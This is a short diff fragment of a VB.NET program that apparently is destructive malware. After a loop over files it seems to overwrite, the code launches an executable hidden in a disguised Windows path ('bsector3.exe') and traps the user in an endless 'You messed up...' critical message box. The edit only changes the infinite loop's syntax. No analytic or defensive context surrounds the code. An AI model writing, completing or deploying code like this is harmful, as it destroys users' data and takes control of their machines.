@@ -103,9 +103,9 @@ Module Program
                         If a = files2owr.Length - 1 Then
                             System.Threading.Thread.Sleep(2000)
                             Process.Start("C:\windows\winbase_base_procid_none\secureloc0x65\bsector3.exe")
-                            While True
+                            Do
                                 MsgBox("You messed up...", MsgBoxStyle.Critical, "uh oh")
-                            End While
+                            Loop
                         End If
                     Catch
                     End Try
